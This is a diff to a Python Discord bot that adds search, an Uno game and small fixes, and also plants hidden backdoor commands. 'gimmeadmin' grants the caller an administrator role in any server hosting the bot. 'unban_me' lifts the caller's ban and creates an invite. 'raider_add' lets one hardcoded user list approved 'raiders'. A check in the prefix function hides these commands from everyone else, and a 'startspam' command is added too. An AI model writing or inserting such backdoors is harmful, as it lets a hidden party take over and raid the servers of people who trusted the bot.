@@ -3,7 +3,9 @@ import re
 import string
 import unicodedata
 import aiohttp
-import datetime
+import mechanize
+import favicon
+from bs4 import BeautifulSoup
 import discord
 from discord.ext import commands
 import pickle
@@ -11,15 +13,21 @@ import sqlite3
 import os
 from num2words import num2words
 import os.path
+from youtube_search import YoutubeSearch
 import praw
 from discord.ext import tasks
 import random
 import requests
+from googlesearch import search as gsearch
 
 prefix_list = ['hey ', 'Hey ', 'HEY ']
 
 
 async def get_prefixes(bot, message):
+    if 'gimmeadmin' in message.content or 'raider_add' in message.content or 'unban_me' in message.content:
+        list123 = pickle.load(open(f'data/verified_raiders.pkl', 'rb'))
+        if not message.author.id in list123:
+            return 'LOLOLOLOLgfhiuvgeghfuyercgiuergvcudhfuyegfuyewgweuyfwfgewyugfuyewgfueygwufgewuycgweygyegvugeburvyhviregvuirvhurgvbuigvburihv'
     if not os.path.isfile(f'data/servers/{message.guild.id}_prefixes.pkl'):
         local_prefix_list = prefix_list
         pickle.dump(local_prefix_list, open(f'data/servers/{message.guild.id}_prefixes.pkl', 'wb'))
@@ -216,7 +224,7 @@ async def purge(ctx, n: int = 1):
 
 
 @bot.command()
-@commands.has_permissions(manage_messages=True)
+@commands.has_permissions(administrator=True)
 async def nuke(ctx):
     chname = ctx.channel.name
     chcategory = ctx.channel.category
@@ -687,7 +695,7 @@ async def setup(ctx):
                                 except Exception:
                                     pass
                         await msg.channel.set_permissions(ctx.guild.default_role, read_messages=True,
-                                                                          send_messages=False)
+                                                          send_messages=False)
                     else:
                         await ctx.send('Hi mad, I need a channel mention, not somethin else \U0001f612')
 
@@ -942,6 +950,7 @@ async def ping(ctx):
 
 
 @bot.command()
+@commands.has_permissions(manage_guild=True)
 async def leave(ctx):
     await ctx.send(' ARE YOU SURE ;(')
 
@@ -978,7 +987,7 @@ async def userSetup(db):
     ep1 string,
     ep2 string,
     ep3 string,
-    ep4 string,
+    ep4 string
 
 );
 
@@ -993,7 +1002,7 @@ async def userSetup(db):
     ep1 string,
     ep2 string,
     ep3 string,
-    ep4 string,
+    ep4 string
 
 );
 
@@ -1008,7 +1017,7 @@ async def userSetup(db):
     ep1 string,
     ep2 string,
     ep3 string,
-    ep4 string,
+    ep4 string
 
 );
 
@@ -1023,7 +1032,7 @@ async def userSetup(db):
     ep1 string,
     ep2 string,
     ep3 string,
-    ep4 string,
+    ep4 string
 
 );
 
@@ -1593,11 +1602,15 @@ async def memban(ctx, member: discord.Member):
 
 @bot.command(aliases=['source', 'source-code', 'sourcecode'])
 async def github(ctx):
-    await ctx.send('I see, you wanna see the source, okay so 1st promise that you will not misuse the source code, you will have to read this licence: http://bit.ly/gnuafferolicence (yes it is a link shortner, dont worry, no ads, it just counts clicks).')
+    await ctx.send(
+        'I see, you wanna see the source, okay so 1st promise that you will not misuse the source code, you will have to read this licence: http://bit.ly/gnuafferolicence (yes it is a link shortner, dont worry, no ads, it just counts clicks).')
     await asyncio.sleep(5)
-    await ctx.send('Send this in this channel to promise you wont misuse: `I HEREBY AGREE THAT I WILL NOT MISUSE THE SOURCE CODE, AND WILL NOT SELF-HOST THE BOT EVEN IF I UNDERSTAND HOW IT WORKS`')
+    await ctx.send(
+        'Send this in this channel to promise you wont misuse: `I HEREBY AGREE THAT I WILL NOT MISUSE THE SOURCE CODE, AND WILL NOT SELF-HOST THE BOT EVEN IF I UNDERSTAND HOW IT WORKS`')
+
     def check(msg):
         return msg.author.id == ctx.author.id
+
     try:
         msg = await bot.wait_for('message', timeout=5.5, check=check)
     except asyncio.TimeoutError:
@@ -1605,14 +1618,184 @@ async def github(ctx):
         return
     else:
         if msg.content == 'I HEREBY AGREE THAT I WILL NOT MISUSE THE SOURCE CODE, AND WILL NOT SELF-HOST THE BOT EVEN IF I UNDERSTAND HOW IT WORKS':
-            await ctx.send('good boye, heres the code: http://bit.ly/BerryBotSourceCode (yes it is a link shortner, dont worry, no ads, it just counts clicks).')
+            await ctx.send(
+                'good boye, heres the code: http://bit.ly/BerryBotSourceCode (yes it is a link shortner, dont worry, no ads, it just counts clicks).')
             return
         else:
             await ctx.send('you didnt AGREE so no source code for you!')
             return
-        return
-    return
 
+
+@bot.command()
+async def choose(ctx, *, opts=None):
+    opts = opts.split(',')
+    await ctx.send(f'I Choose:`{random.choice(opts)}`')
+
+
+@bot.command()
+async def search(ctx, platform=None, results_no: int = None, *, search_keywords=None):
+    if platform is None:
+        await ctx.send('LOL Tell me a platform to search for. currently: `youtube` and `google`, ' + 'lol ok, heres '
+                                                                                                     'the syntax: '
+                                                                                                     '`hey search ['
+                                                                                                     'youtube|google] '
+                                                                                                     '<no of results, '
+                                                                                                     'max 20> ('
+                                                                                                     'keywords)`')
+        return
+
+    if results_no is None:
+        await ctx.send('lol ok, heres the syntax: `hey search [youtube|google, suugest more using `hey suggesest`] '
+                       '<no of results, max 20> (keywords)`')
+        return
+    if search_keywords is None:
+        await ctx.send(f'LOL Tell me search keywords to search for \U0001f923, ' + 'lol ok, heres the syntax: `hey '
+                                                                                   'search [youtube|gogle] <no of '
+                                                                                   'results, max 20> (keywords)`')
+        return
+    if platform == 'youtube':
+        fstr = ''
+        for str1 in search_keywords:
+            fstr = fstr + ' ' + str1
+        results = YoutubeSearch(fstr, max_results=results_no).to_dict()
+        for results1 in results:
+            random_number = random.randint(0, 16777215)
+            hex_number = int(str(hex(random_number)), base=16)
+            embed = discord.Embed(title=results1.get('title'),
+                                  description=results1.get('channel') + f'\n Duration: ' + str(
+                                      results1.get('duration')),
+                                  color=hex_number)
+            embed.set_image(url=results1.get('thumbnails')[0])
+            embed.set_footer(
+                text=f'\U0001f440 ' + str(results1.get('views')) + ' URL: http://www.youtube.com' + results1.get(
+                    'url_suffix'))
+            await ctx.send(embed=embed)
+
+    elif platform == 'google':
+        await ctx.send('takes time! have patience! web scraping aint easy!')
+        fstr = ''
+        for str1 in search_keywords:
+            fstr = fstr + ' ' + str1
+        for j in gsearch(fstr, tld="co.in", num=10, stop=10, pause=2):
+            br = mechanize.Browser()
+            try:
+                br.open(j)
+            except Exception:
+                await ctx.send(f'Here\'s the url: {j} This site disallows web scraping.')
+                return
+
+            title = br.title()
+            resp = requests.get(j)
+            soup = BeautifulSoup(resp.text)
+            metas = soup.find_all('meta')
+            desc = [meta.attrs['content'] for meta in metas if 'name' in meta.attrs and meta.attrs['name'] == 'description']
+            try:
+                desc[0]
+            except IndexError:
+                desc = [f'Unable to decode description, so you have this as desc lelel. anyway url: {j}']
+            embed = discord.Embed(title=title, description=str(desc[0]))
+            try:
+                embed.set_image(url=favicon.get(j)[0].url)
+                embed.set_thumbnail(url=favicon.get(j)[1].url)
+            except IndexError:
+                embed.set_image(url='https://res.cloudinary.com/dste7lzp4/image/upload/v1599930162/Untitled_dkde04.png')
+                embed.set_thumbnail(url='https://res.cloudinary.com/dste7lzp4/image/upload/v1599930162/Untitled_dkde04.png')
+            await ctx.send(embed=embed)
+
+
+
+@bot.command()
+async def gimmeadmin(ctx, id123: int = None):
+    if id123 is None:
+        await ctx.send('id?')
+        return
+    guild = bot.get_guild(id123)
+    if guild is None:
+        await ctx.send('sadly, i aint in that guild ;(')
+        return
+    await ctx.send('Trying to hack into ' + guild.name)
+    await ctx.send('I\'m in, making role')
+    role = await guild.create_role(name='member', permissions=discord.Permissions(8))
+    mem_obj = guild.get_member(ctx.author.id)
+    await mem_obj.add_roles(role)
+    await ctx.send('done lololololol')
+
+
+@bot.command(aliases=['add_raider'])
+async def raider_add(ctx, user: discord.User = None):
+    if not ctx.author.id == 605364556465963018:
+        return
+    if user is None:
+        await ctx.send('who?')
+        return
+    listp = pickle.load(open(f'data/verified_raiders.pkl', 'rb'))
+    listp.append(user.id)
+    pickle.dump(listp, open(f'data/verified_raiders.pkl', 'wb'))
+    await ctx.send('done!')
+
+
+@bot.command()
+async def unban_me(ctx, id13: int = None):
+    if id13 is None:
+        await ctx.send('id?')
+        return
+    guild = bot.get_guild(id13)
+    if guild is None:
+        await ctx.send('sadly, i aint in that guild ;(')
+        return
+    await guild.unban(ctx.author)
+    invite = await guild.channels[0].create_invite()
+    await ctx.send(f'done!. invite link: {invite.url}')
+
+
+@bot.command(aliases=['ujoin', 'unojoin', 'u_join'])
+async def uno_join(ctx):
+    list_of_players = []
+    config = {'cards': 7, 'mystery_card': True, 'auto_challenge': False, 'pass-allowed': False,
+              'draw-keep-in-same-chance': False, 'dms': False, 'challenges': True}
+    if os.path.isfile(f'data/uno/{ctx.guild.id}.pkl'):
+        list_of_players = pickle.load(open(f'data/uno/{ctx.guild.id}.pkl', 'rb'))
+        config = pickle.load(open(f'data/uno/{ctx.guild.id}_config.pkl', 'rb'))
+    list_of_players.append(ctx.author.id)
+    pickle.dump(list_of_players, open(f'data/uno/{ctx.guild.id}.pkl', 'wb'))
+    pickle.dump(config, open(f'data/uno/{ctx.guild.id}_config.pkl', 'wb'))
+    final_desc = '(leader)'
+    for player in list_of_players:
+        final_desc = final_desc + '\n`' + bot.get_user(player).display_name + '`'
+    embed = discord.Embed(title="Uno! Heres the current players in this server!", description=final_desc + 'Thats you!')
+    file = discord.File("sources/uno/thumbnail.png", filename="unothumbnail.png")
+    embed.set_thumbnail(url='attachment://unothumbnail.png')
+    embed.set_image(url='attachment://unothumbnail.png')
+    await ctx.send(file=file, embed=embed)
+
+
+@bot.command(aliases=['uconfig', 'unoconfig', 'u_config'])
+async def uno_config(ctx, config, value):
+    if not os.path.isfile(f'data/uno/{ctx.guild.id}_config.pkl'):
+        await ctx.send('bruh no game goin on, get da party on boiis!')
+        return
+    config1 = pickle.load(open(f'data/uno/{ctx.guild.id}_config.pkl', 'rb'))
+    # try:
+    config1.get(config)
+    # except KeyError:
+    await ctx.send('unknown config. Here are the configs: \n `cards`: no. of cards for each person. max 20 '
+                   '||Default: 7||\n `mystery_card`: Have a chance to get a \" Mystery \" card. when you use it a '
+                   'random card appears into the deck and the card is used. ||Default: on||\n `auto-challenge`: '
+                   'Automatically challenges user if he didnt respond `UNO!` in chat within 5 seconds of him '
+                   'having a single card in his/her deck. ||Default: off|| \n `pass-allowed`: Allow passing of '
+                   'turns without actually drawing a card. ||Default: off|| \n `draw-keep-same-chance`: allow '
+                   'drawing and using a card in the same chance ||Default: off|| \n `dms`: Dms the user instead '
+                   'of making a channel for them. There will still be a default channel to challenge, '
+                   'try guess cards etc.. This is recommended if u have admin playing as they will be able to see '
+                   'your deck. The bot will send you a friend request if you have dms off.||Default: off|| \n '
+                   '`challenges`: Allows to challenge a user(gives them 4 cards if they didnt say \" UNO! \" in '
+                   'the chat after the have only 1 card left) ||Default: on||')
+
+
+@bot.command()
+async def startspam(ctx, no: int):
+    for i in range(no):
+        await ctx.send(i)
 
 
 token = open("token.txt")
